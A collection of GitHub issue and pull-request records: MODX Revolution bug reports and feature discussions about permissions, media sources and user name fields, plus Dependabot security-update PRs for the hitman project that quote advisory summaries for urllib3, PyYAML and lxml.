modxcms/revolution,35531581,"Media sources bug or feature re: permissions","Media source APIs check if it can write to the root of the media source even if a script using the API is trying to create a certain subdirectory. If the root is not writeable, it stops trying. Affects installations where the media source root is locked down via server file permissions but some subdirectory is allowed.
","To add some specific context, this is the modFileMediaSource.createContainer method when the `$parentContainer` is empty or a slash, but `$name` contains `foo/bar/something/`. It works if the media source root is writable, but it doesn't if the root is not writable. We use this in the modmore premium extras to ensure user-defined paths exist but it doesn't always work because of this bug. 
",no,"bug,area-core,area-security,urgent,"
modxcms/revolution,26696222,"Consistent Naming in Access Permission Names","smashingred created Redmine issue ID 7358

Currently in the Access Policy edit screen we names of actions to enable for the policy. In some cases we've a set of names that start with 'new' as in 'new_chunk' in the case of creating a chunk. In this case we have the action+object in a naming scheme of action_object. In other cases we have a setting that follows the object+action using the naming scheme of object_action; example: 'policy_new' and thirdly we have other policies that are all encompassing that enable all access to particular actions as is the case for 'property_sets' which gives you the ability to view or edit Property Sets. 

While it's understood that the concept of objects and actions are abstract analogies in this case it would be helpful to be consistent with naming and granularity of the items named in the Access Policy. 

I'd propose the 'object_action' naming because this would by default sort all the names by the 'object' to be affected and all associated 'actions' could then be sequentially listed. For instance you would then have:

chunk_create 
chunk_edit
chunk_quick_create
chunk_save
chunk_delete
chunk_remove
chunk_view

and likewise you could have 
locks_remove

Furthermore. It would make sense to split all view/edit entries so that they can be separate. There could be cases where you want to grant access to view something but not be able to make changes. However, I do realize that you'd hardly want to allow someone to edit without being able to view it. That could be addressed in the description.
","everettg_99 submitted:

I'm completely in favor of consistency in the naming conventions.  I could even imagine granting permissions via some type of regex matching, e.g. ""chunks_*"" to match all chunk related permissions.  
smashingred submitted:

My thought on this too Everett is that if you had search filters on the grid and bulk edits you could quickly handle those without regex. 
smashingred submitted:

Now, one could introduce metadata with tags and categorize them too but my naming convention seemed much simpler and easier to refactor. Following an analogy of ""objects"" and ""actions"" in any case will help make sense of it all.
Related with https://github.com/modxcms/revolution/issues/14313",no,"feature,area-security,"
modxcms/revolution,556684534,"[3.x] public access to /composer.json","## Bug report

After installing modx3, there is public access to `http://sitename.com/composer.json`, which can affect security, as anyone has a list of installed packages and their versions.","I think it might be a good idea to make the repository contain both a public_html and a private folder, where the core directory is stored inside `/private/core/` and the composer file inside `/private/core/composer.json`. The `public_html` name can be easily changed to the desired structure (E.g. public_html/httpdocs etc).

This way:
1. The composer.json no longer is publicly available by default.
2. The composer.json file location can also depend on the same setting as the `MODX_CORE_PATH`.
3. You'll be able to make the MODX installation less secure by moving the core directory into the webroot.  So if your server configuration only allows access to the public_html directory you'll be able to move the core directory into the webroot again.

Now its the other way around, by default MODX is less secure and you'll have to harden the installation yourself by moving the core folder. Wouldn't it be nicer if the MODX installation by default is more secure and that a manual action is needed to make it less secure.Great suggestion(s)!   

Some things to consider:
1. If we add a ""public"" directory a ""private"" directory isn't necessary.
2. In most cases MODX will be installed in the web root. 
Unless the ""public"" directory is the actual web root we still have to to block access to non-public directories and files like `composer.json`.
3. How do we migrate the ""old"" directory structure to the new one for users upgrading?",no,"bug,area-security,"
modxcms/revolution,26696402,"User Profile: Firstname & lastname field instead of fullname","markh created Redmine issue ID 7695

Some applications reusing the existing security system require a separate first and last name, which, while possible by using extended fields or custom fields, is not as intuitive as it should be. 

I'd like to propose replacing the User Profile's fullname field with two separate fields for first and last name, and for backwards compatibility creating a fullname alias to firstname + lastname (or even better, a configurable way of concatenating first and lastname, such as ""lastname, firstname"").  This would allow more flexibility compared to what is offered now and make it easier to integrate with custom systems that expect them separately. 

With something like this we may need to consider the middle thingy in a name (don't think it's common in the US, but it is down here):

<pre>
firstname +(de|van (den|der)?|ten)+ lastname
</pre>

No idea what the English term for that is. It's tussenvoegsel in Dutchy.
","christianseel submitted:

I would like to push this for the upcoming MODX 2.3.0!

Also Discuss is splitting the fullname currently very ugly... So MODX 2.3 can do this too!

Jay came up with the idea to continue using the fullname field (as backup for existing projects) and only adding firstname and lastname. During the update the fullname could be splitted with a nice function that we could work on together.

I think it's a shame that MODX ""Revolution"" has only a fullname field - let's change this!
boomerang submitted:

I'd like to see this added as it would make linking with other products eg MailChimp or Foxycart so much easier. Otherwise its extending the moduser which isn't for everyone.
:+1: 
As @christianseel mentioned, I did propose to have a First, Last and keep Fullname for legacy installations and on upgrades, we could do a best guess split or it could be a post-upgrade process. At modx.com we currently use a processor to guess the first name and last names, but as I am sure you realize it's limited. Here's an example of how we're using in hook for mailchimp: 

``` php
// Get the Names
$fullname = $hook->getValue($field_fullname);

list( $fname, $mname, $lname ) = explode( ' ', $fullname, 3 );
if ( is_null($lname) ) {
    //Meaning only two names were entered...
    $lastname = $mname;
} else {
    $lname = explode( ' ', $lname );
    $size = sizeof($lname);
    $lastname = $lname[$size-1];
}
$my_email = $hook->getValue($field_email);
$merge_vars = array('FNAME'=>$fname, 'LNAME'=>$lastname);
$modx->setPlaceholders(array(
    'contact_first' => $fname,
    'contact_last' => $lastname,
),'ch.');
```
Agreed, we should have First, Middle, Last with the current fullname being populated with the concat'ed versions of the new fields IMO.
Really? Middle too?
I concur, not sure middle is needed. Suggest simplicity is golden.

On 7 Jun 2014, at 20:23, OptimusCrime notifications@github.com wrote:

Really? Middle too?

—
Reply to this email directly or view it on GitHub
https://github.com/modxcms/revolution/issues/7695#issuecomment-45418842.
We should add fields for the first- and last name but also keep one for the fullname.
This makes it possible to use an alternative full name. First name: John, last name: Doe and full name J. Doe[To split or not to split?](https://www.w3.org/International/questions/qa-personal-names#singlefield)
> If designing a form or database that will accept names from people with a variety of backgrounds, you should ask yourself whether you really need to have separate fields for given name and family name .
> 
> This will depend on what you need to do with the data, but obviously it will be simpler, where it is possible, to just use the full name as the user provides it.

@Mark-H shared links with more information about this complex topic: https://github.com/modxcms/revolution/pull/14803#issuecomment-558621063).

After doing more research I don't think adding a first- and last name field to the core is a good idea. 

Really, why was this closed? Having first and last name fields is such basic data. Without it, there is no way to sort by last name reliably, as Jay commented 8 years ago. I was just going to add a request to add this. What is the issue with adding this to the core? The extra ""ExtraFields"" was recently released that makes adding fields to the table possible, but I'd rather not have to depend on that. @SnowCreative did you read my last comment and the links with more information about this? 
Having a first- and last name field seems as something basic, but it actually isn't: https://www.w3.org/International/questions/qa-personal-names

Therefore I decided it's best if we keep the most simple form that works in all cases, a full name. Yes, names can be complicated. But I didn't see anything in that article that would argue against having multiple name fields, whatever you decide to call them. And if you take the article ""Falsehoods Programmers Believe About Names"" as your guide, you would have to set up more than one name field because some people use more than one full name!

You seem to be making this an either/or situation, which I don't think it is. I would argue that fullname does NOT ""work"" in all cases, because at least for Western names, you can't sort in the desired way by fullname. Why not have fullname and ALSO first/last (or whatever) names? This setup would truly ""work"" in all cases. I understand that you don't want to REPLACE fullname with the two name fields, as was the idea in the original request.

I would also bet that the vast majority of MODX users use first/last or given/family or given/patronymic or name1/name2 names. If particular users don't want to use these two fields, then they can ignore them and just use fullname, or use them and call them something else. My main complaint is that, for the vast majority of MODX users who want to use two names and potentially sort by them, there is no way to enable this in the core.

For comparison:

- Wordpress has first and last name fields for users, as well as a nickname.
- Drupal's core Profile module lets you enable first and last name fields, and there is a Name Field module that lets you set up title, given name, middle name, family name, generational suffix, and credentials.
- Concrete has an option to enable the user attributes first_name and last_name.
- ProcessWire has first and last names for users.
- Hubspot has first and last name fields for users (as I'll bet just about all customer relation managers do). As boomerang noted above, having two names would make linking from MODX to external products easier.

I'm sure many other CMSs have two name fields for users, in addition to a full name or nickname. People coming to MODX from these other systems may wonder why they can't enter two names. I've seen lots of posts in various discussion boards asking this very question — how to enter first and last names in CMSs that don't have this built in.

I agree with Michael on this one; I've always disliked that full name is the only option.There are other cultures where a first and last name may not be adequate.

https://culturalatlas.sbs.com.au/mexican-culture/mexican-culture-naming> There are other cultures where a first and last name may not be adequate.

Anyone creating a site for Mexico could use just the fullname field. Or they can use all three name fields for whatever they want (fullname + nickname, or personal name + father's name + mother's name, or whatever). And if a site truly has a more unusual need for the name fields, the extra ""ExtraFields"" can be used to set that up (thanks, Aleksandr! [Boshnik](https://github.com/Boshnik)).I would say, usually just for user management, and that is what the build-in tables are for, a fullname should be enough to identify a user by name.
If you need more, than just a user management, in most cases you will need more additional fields than just a first and lastname and you will create custom tables anyway, IMO.> I would say, usually just for user management, and that is what the build-in tables are for, a fullname should be enough to identify a user by name.
> If you need more, than just a user management, in most cases you will need more additional fields than just a first and lastname and you will create custom tables anyway, IMO.

The main User table just has username and password, but the built-in Profile table (user attributes) already has much more — email, phone, mobile phone, address, country, zip, fax, photo, website. Everything you'd expect in a basic customer management system, except the name fields. > The main User table just has username and password, but the built-in Profile table (user attributes) already has much more — email, phone, mobile phone, address, country, zip, fax, photo, website. Everything you'd expect in a basic customer management system, except the name fields.

That allready are to much unused fields, in most cases. I would prefer to have the essential fields like email and maybe a fullname within the user table and have a way, like TVs for resources, where we could add as many fields as needed for specific use-cases or a built-in way to create custom - tables with custom fields(something like MIGXdb), which could be connected in a simple way to the user table and added to the user-management.  I always create custom tables for customer management systems. That frees me up to do whatever I want. But I'm talking about something much simpler here. When I view a list of MODX users, I can sort by username, I can sort by email address, but I can't sort by last name, which is a very common need for Western website users. 

There are also numerous extras that use MODX's built-in user system — extras that need to record certain basic info. They don't create any custom tables. And they can't enter fields you see on the great majority of signup forms out there: first and last name.Can we turn this into a detailed proposal that would, from a core point of view, be useful around the world? Including how to deal with upgrades, what should be required or optional, what the recommended course of action for extras interacting with it would be, etc? ",no,"feature,area-security,"
modxcms/revolution,26695605,"Add Filter to Access Policy Editor View","smashingred created Redmine issue ID 5822

It would be nice if you could filter the items in the access policy editor view so you could filter on terms such as ""resource"" or ""save"" and manage the access for those matching.

This is the view being referenced:
!https://img.skitch.com/20110929-njwc9sikknx8qb9db755pjhd12.png!
",,no,"feature,area-security,"
modxcms/revolution,28284773,"Duplicate Access Policies results in false copy (2.2.10)","I duplicated and edited an access policy (Content Editor) and removed the right to add resources or duplicate them.

On edit, the duplicated values are not like before. If i seledt and edit the policy, the correct values appear in the field again.

before touching the last dropdown input
![vor](https://f.cloud.github.com/assets/2450164/2263031/eef243f6-9e60-11e3-8a5d-87252e5558b4.png)
after touching it (and selecting the same value)
![nach](https://f.cloud.github.com/assets/2450164/2263034/f1e1e9ea-9e60-11e3-8cf4-6748dc41f837.png)

Then i compared the original and the duplicated values in the database.
Original:
{""change_profile"":true,""class_map"":true,""countries"":true,""edit_document"":true,""frames"":true,""help"":true,""home"":true,""load"":true,""list"":true,""logout"":true,""menu_reports"":true,""menu_site"":true,""menu_support"":true,""menu_tools"":true,""menu_user"":true,""resource_duplicate"":true,""resource_tree"":true,""save_document"":true,""source_view"":true,""tree_show_resource_ids"":true,""view"":true,""view_document"":true,""new_document"":true,""delete_document"":true}
Copy with less permissions:
{""about"":false,""access_permissions"":false,""actions"":false,""change_password"":true,""change_profile"":false,""charsets"":false,""class_map"":true,""components"":false,""content_types"":false,""countries"":true,""create"":false,""credits"":false,""customize_forms"":false,""dashboards"":false,""database"":false,""database_truncate"":false,""delete_category"":false,""delete_chunk"":false,""delete_context"":false,""delete_document"":false,""delete_eventlog"":false,""delete_plugin"":false,""delete_propertyset"":false,""delete_role"":false,""delete_snippet"":false,""delete_template"":false,""delete_tv"":false,""delete_user"":false,""directory_chmod"":false,""directory_create"":false,""directory_list"":false,""directory_remove"":false,""directory_update"":false,""edit_category"":false,""edit_chunk"":false,""edit_context"":false,""edit_document"":true,""edit_locked"":false,""edit_plugin"":false,""edit_propertyset"":false,""edit_role"":false,""edit_snippet"":false,""edit_template"":false,""edit_tv"":false,""edit_user"":false,""element_tree"":false,""empty_cache"":false,""error_log_erase"":false,""error_log_view"":false,""export_static"":false,""file_create"":false,""file_list"":false,""file_manager"":false,""file_remove"":false,""file_tree"":false,""file_update"":false,""file_upload"":false,""file_view"":false,""flush_sessions"":false,""frames"":true,""help"":true,""home"":true,""import_static"":false,""languages"":false,""lexicons"":false,""list"":true,""load"":true,""logout"":true,""logs"":false,""menus"":false,""menu_reports"":false,""menu_security"":false,""menu_site"":true,""menu_support"":true,""menu_system"":false,""menu_tools"":false,""menu_user"":false,""messages"":false,""namespaces"":false,""new_category"":false,""new_chunk"":false,""new_context"":false,""new_document"":false,""new_document_in_root"":false,""new_plugin"":false,""new_propertyset"":false,""new_role"":false,""new_snippet"":false,""new_static_resource"":false,""new_symlink"":false,""new_template"":false,""new_tv"":false,""new_user"":false,""new_weblink"":false,""packages"":false,""policy_delete"":false,""policy_edit"":false,""policy_new"":false,""policy_save"":false,""policy_template_delete"":false,""policy_template_edit"":false,""policy_template_new"":false,""policy_template_save"":false,""policy_template_view"":false,""policy_view"":false,""property_sets"":false,""providers"":false,""publish_document"":false,""purge_deleted"":false,""remove"":false,""remove_locks"":false,""resourcegroup_delete"":false,""resourcegroup_edit"":false,""resourcegroup_new"":false,""resourcegroup_resource_edit"":false,""resourcegroup_resource_list"":false,""resourcegroup_save"":false,""resourcegroup_view"":false,""resource_duplicate"":false,""resource_quick_create"":false,""resource_quick_update"":false,""resource_tree"":false,""save"":false,""save_category"":false,""save_chunk"":false,""save_context"":false,""save_document"":true,""save_plugin"":false,""save_propertyset"":false,""save_role"":false,""save_snippet"":false,""save_template"":false,""save_tv"":true,""save_user"":false,""search"":false,""settings"":false,""sources"":false,""source_delete"":false,""source_edit"":false,""source_save"":false,""source_view"":true,""steal_locks"":false,""tree_show_element_ids"":false,""tree_show_resource_ids"":false,""undelete_document"":false,""unlock_element_properties"":false,""unpublish_document"":false,""usergroup_delete"":false,""usergroup_edit"":false,""usergroup_new"":false,""usergroup_save"":false,""usergroup_user_edit"":false,""usergroup_user_list"":false,""usergroup_view"":false,""view"":true,""view_category"":false,""view_chunk"":false,""view_context"":false,""view_document"":true,""view_element"":false,""view_eventlog"":false,""view_offline"":false,""view_plugin"":false,""view_propertyset"":false,""view_role"":false,""view_snippet"":false,""view_sysinfo"":false,""view_template"":false,""view_tv"":true,""view_unpublished"":false,""view_user"":false,""workspaces"":false}

I hope that this helps.
","Maybe related to #13994",no,"bug,area-security,area-acl,"
jrabbit/hitman,926060299,"[Security] Bump urllib3 from 1.25.8 to 1.25.9","Bumps [urllib3](https://github.com/urllib3/urllib3) from 1.25.8 to 1.25.9. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-wqvq-5m8c-6g24"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>CRLF injection</strong>
urllib3 before 1.25.9 allows CRLF injection if the attacker controls the HTTP request method, as demonstrated by inserting CR and LF control characters in the first argument of putrequest(). NOTE: this is similar to CVE-2020-26116.</p>
<p>Affected versions: &lt; 1.25.9</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/urllib3/urllib3/blob/main/CHANGES.rst"">urllib3's changelog</a>.</em></p>
<blockquote>
<h1>1.25.9 (2020-04-16)</h1>
<ul>
<li>
<p>Added <code>InvalidProxyConfigurationWarning</code> which is raised when erroneously specifying an HTTPS proxy URL. urllib3 doesn't currently support connecting to HTTPS proxies but will soon be able to and we would like users to migrate properly without much breakage.</p>
<p>See <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1850"">this GitHub issue</a> for more information on how to fix your proxy config. (Pull <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1851"">#1851</a>)</p>
</li>
<li>
<p>Drain connection after <code>PoolManager</code> redirect (Pull <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1817"">#1817</a>)</p>
</li>
<li>
<p>Ensure <code>load_verify_locations</code> raises <code>SSLError</code> for all backends (Pull <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1812"">#1812</a>)</p>
</li>
<li>
<p>Rename <code>VerifiedHTTPSConnection</code> to <code>HTTPSConnection</code> (Pull <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1805"">#1805</a>)</p>
</li>
<li>
<p>Allow the CA certificate data to be passed as a string (Pull <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1804"">#1804</a>)</p>
</li>
<li>
<p>Raise <code>ValueError</code> if method contains control characters (Pull <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1800"">#1800</a>)</p>
</li>
<li>
<p>Add <code>__repr__</code> to <code>Timeout</code> (Pull <a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1795"">#1795</a>)</p>
</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/urllib3/urllib3/commit/21758b0694ea53b499e832a993e8d1ada01135b2""><code>21758b0</code></a> Release v1.25.9</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/c930dc033bdab20d03dc9fa626ee636788c86040""><code>c930dc0</code></a> Add InvalidProxyConfigurationWarning for HTTPS proxies</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/2ec3438afbd581d0106edbbcf53f672f06636485""><code>2ec3438</code></a> Fix flaky test by setting longer connect timeout</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/262ac6b00150e70aa9cbe7a67ce6df55d62d984b""><code>262ac6b</code></a> Backslash terminates authority URL section</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/c392b6c21e7b7f18f632af70028f3c8ff72451ac""><code>c392b6c</code></a> Fix documentation build by skipping Sphinx 3.0.0 (<a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1844"">#1844</a>)</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/6580893458fae1eb49c512684c36a751d788a660""><code>6580893</code></a> Revert &quot;Add context to find_unused_port&quot;</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/308a08f7bd401f9e0309cdce9f2b615fe519e437""><code>308a08f</code></a> Unwrap ProxyError when evaluating retries (<a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1830"">#1830</a>)</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/240aa20606f72baa16b42a1be8b0a5447465629a""><code>240aa20</code></a> Drain connection after PoolManager redirect (<a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1817"">#1817</a>)</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/5777ec4d9e1dcc875c2150562c518c8ca52ebf17""><code>5777ec4</code></a> Detect GitHub Actions as continuous integration (<a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1840"">#1840</a>)</li>
<li><a href=""https://github.com/urllib3/urllib3/commit/8e1fe6c6d7707697c600d1946627346ac722df1d""><code>8e1fe6c</code></a> Switch macOS CI to GitHub Actions (<a href=""https://github-redirect.dependabot.com/urllib3/urllib3/issues/1839"">#1839</a>)</li>
<li>Additional commits viewable in <a href=""https://github.com/urllib3/urllib3/compare/1.25.8...1.25.9"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=urllib3&package-manager=pip&previous-version=1.25.8&new-version=1.25.9)](https://dependabot.com/compatibility-score/?dependency-name=urllib3&package-manager=pip&previous-version=1.25.8&new-version=1.25.9)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
jrabbit/hitman,864813546,"[Security] Bump pyyaml from 5.3 to 5.3.1","Bumps [pyyaml](https://github.com/yaml/pyyaml) from 5.3 to 5.3.1. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-6757-jp84-gxfx"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Improper Input Validation in PyYAML</strong>
A vulnerability was discovered in the PyYAML library in versions before 5.3.1, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. An attacker could use this flaw to execute arbitrary code on the system by abusing the python/object/new constructor.</p>
<p>Affected versions: &lt; 5.3.1</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/yaml/pyyaml/blob/master/CHANGES"">pyyaml's changelog</a>.</em></p>
<blockquote>
<p>5.3.1 (2020-03-18)</p>
<ul>
<li><a href=""https://github-redirect.dependabot.com/yaml/pyyaml/pull/386"">yaml/pyyaml#386</a> -- Prevents arbitrary code execution during python/object/new constructor</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/yaml/pyyaml/commit/538b5c93f7d5dee40322893c1e524e94a4f8bbde""><code>538b5c9</code></a> Update announcement.msg</li>
<li><a href=""https://github.com/yaml/pyyaml/commit/8a01c99c63c431fa79931c1913339ac41e6b872d""><code>8a01c99</code></a> Move test files back into tests/data/</li>
<li><a href=""https://github.com/yaml/pyyaml/commit/91bca4b856700c2975572ea85d9d785670a52813""><code>91bca4b</code></a> Update version to 5.3.1</li>
<li><a href=""https://github.com/yaml/pyyaml/commit/5080ba513377b6355a0502104846ee804656f1e0""><code>5080ba5</code></a> Prevents arbitrary code execution during python/object/new constructor (<a href=""https://github-redirect.dependabot.com/yaml/pyyaml/issues/386"">#386</a>)</li>
<li>See full diff in <a href=""https://github.com/yaml/pyyaml/compare/5.3...5.3.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=pyyaml&package-manager=pip&previous-version=5.3&new-version=5.3.1)](https://dependabot.com/compatibility-score/?dependency-name=pyyaml&package-manager=pip&previous-version=5.3&new-version=5.3.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,"
jrabbit/hitman,837927180,"[Security] Bump lxml from 4.5.0 to 4.6.3","Bumps [lxml](https://github.com/lxml/lxml) from 4.5.0 to 4.6.3. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-jq4v-f5q6-mjqq"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Cross-Site Scripting in lxml</strong>
lxml 4.6.2 allows XSS. It places the HTML action attribute into defs.link_attrs (in html/defs.py) for later use in input sanitization, but does not do the same for the HTML5 formaction attribute.</p>
<p>Affected versions: &lt; 4.6.3</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-pgww-xf46-h92r"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>XSS in lxml</strong>
A XSS vulnerability was discovered in python-lxml's clean module. The module's parser didn't properly imitate browsers, which caused different behaviors between the sanitizer and the user's page. A remote attacker could exploit this flaw to run arbitrary HTML/JS code.</p>
<p>Affected versions: &lt; 4.6.2</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/lxml/lxml/blob/master/CHANGES.txt"">lxml's changelog</a>.</em></p>
<blockquote>
<h1>4.6.3 (2021-03-21)</h1>
<h2>Bugs fixed</h2>
<ul>
<li>A vulnerability (CVE-2021-28957) was discovered in the HTML Cleaner by Kevin Chung,
which allowed JavaScript to pass through.  The cleaner now removes the HTML5
<code>formaction</code> attribute.</li>
</ul>
<h1>4.6.2 (2020-11-26)</h1>
<h2>Bugs fixed</h2>
<ul>
<li>A vulnerability (CVE-2020-27783) was discovered in the HTML Cleaner by Yaniv Nizry,
which allowed JavaScript to pass through.  The cleaner now removes more sneaky
&quot;style&quot; content.</li>
</ul>
<h1>4.6.1 (2020-10-18)</h1>
<h2>Bugs fixed</h2>
<ul>
<li>A vulnerability was discovered in the HTML Cleaner by Yaniv Nizry, which allowed
JavaScript to pass through.  The cleaner now removes more sneaky &quot;style&quot; content.</li>
</ul>
<h1>4.6.0 (2020-10-17)</h1>
<h2>Features added</h2>
<ul>
<li>
<p>GH#310: <code>lxml.html.InputGetter</code> supports <code>__len__()</code> to count the number of input fields.
Patch by Aidan Woolley.</p>
</li>
<li>
<p><code>lxml.html.InputGetter</code> has a new <code>.items()</code> method to ease processing all input fields.</p>
</li>
<li>
<p><code>lxml.html.InputGetter.keys()</code> now returns the field names in document order.</p>
</li>
<li>
<p><a href=""https://github-redirect.dependabot.com/lxml/lxml/issues/309"">GH-309</a>: The API documentation is now generated using <code>sphinx-apidoc</code>.
Patch by Chris Mayo.</p>
</li>
</ul>
<h2>Bugs fixed</h2>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/lxml/lxml/commit/a5f9cb52079dc57477c460dbe6ba0f775e14a999""><code>a5f9cb5</code></a> Prepare release of lxml 4.6.3.</li>
<li><a href=""https://github.com/lxml/lxml/commit/2d01a1ba8984e0483ce6619b972832377f208a0d""><code>2d01a1b</code></a> Add HTML-5 &quot;formaction&quot; attribute to &quot;defs.link_attrs&quot; (<a href=""https://github-redirect.dependabot.com/lxml/lxml/issues/316"">GH-316</a>)</li>
<li><a href=""https://github.com/lxml/lxml/commit/e986a9cb5d54827c59aefa8803bc90954d67221e""><code>e986a9c</code></a> Fix reference in docs.</li>
<li><a href=""https://github.com/lxml/lxml/commit/4cb57362deb23bca0f70f41ab1efa13390fcdbb1""><code>4cb5736</code></a> Work around Py2's lack of &quot;re.ASCII&quot;.</li>
<li><a href=""https://github.com/lxml/lxml/commit/c30106ff2648cdafe7857654e9606c491b1acf4d""><code>c30106f</code></a> Prepare release of 4.6.2.</li>
<li><a href=""https://github.com/lxml/lxml/commit/a105ab8dc262ec6735977c25c13f0bdfcdec72a7""><code>a105ab8</code></a> Prevent combinations of &lt;math/svg&gt; and &lt;style&gt; to sneak JavaScript through th...</li>
<li><a href=""https://github.com/lxml/lxml/commit/c053dc159c7f0a6a98922c937a0baede7ce7af9d""><code>c053dc1</code></a> Add a recipe for a look-ahead generator to allow modifications during tree it...</li>
<li><a href=""https://github.com/lxml/lxml/commit/b083124281d824eb861ff58e7276a5c1f1d8c18d""><code>b083124</code></a> lxml actually works in Py3.9.</li>
<li><a href=""https://github.com/lxml/lxml/commit/0f80590d7ebe62c61d2bdf2a220a093821dcbab8""><code>0f80590</code></a> lxml actually works in Py3.9.</li>
<li><a href=""https://github.com/lxml/lxml/commit/fd8893ccb538e95c5acb2a2b47f0e87003de5b0d""><code>fd8893c</code></a> Add a doc note that the .find() methods are usually faster than one might exp...</li>
<li>Additional commits viewable in <a href=""https://github.com/lxml/lxml/compare/lxml-4.5.0...lxml-4.6.3"">compare view</a></li>
</ul>
</details>
<br />


